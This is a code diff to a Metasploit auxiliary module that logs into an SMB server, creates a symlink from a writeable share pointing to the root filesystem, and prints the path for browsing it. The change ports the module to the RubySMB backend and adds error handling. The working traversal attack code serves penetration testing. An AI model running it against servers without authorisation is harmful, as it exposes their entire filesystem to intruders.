@@ -50,17 +50,19 @@ class MetasploitModule < Msf::Auxiliary
 
   def run
     print_status('Connecting to the server...')
-    connect(versions: [1])
+    connect(versions: [1], backend: :ruby_smb)
     smb_login
 
     print_status("Trying to mount writeable share '#{datastore['SMBSHARE']}'...")
     simple.connect("\\\\#{rhost}\\#{datastore['SMBSHARE']}")
 
     print_status("Trying to link '#{datastore['SMBTARGET']}' to the root filesystem...")
-    simple.client.symlink(datastore['SMBTARGET'], '../' * 10)
+    simple.client.last_tree.set_unix_link(symlink: datastore['SMBTARGET'], target: '../' * 10)
 
     print_status('Now access the following share to browse the root filesystem:')
-    print_status("\t\\\\#{rhost}\\#{datastore['SMBSHARE']}\\#{datastore['SMBTARGET']}\\")
-    print_line('')
+    print_status("    \\\\#{rhost}\\#{datastore['SMBSHARE']}\\#{datastore['SMBTARGET']}\\")
+  rescue RubySMB::Error::UnexpectedStatusCode => e
+    print_error(e.message)
+    elog(e)
   end
 end
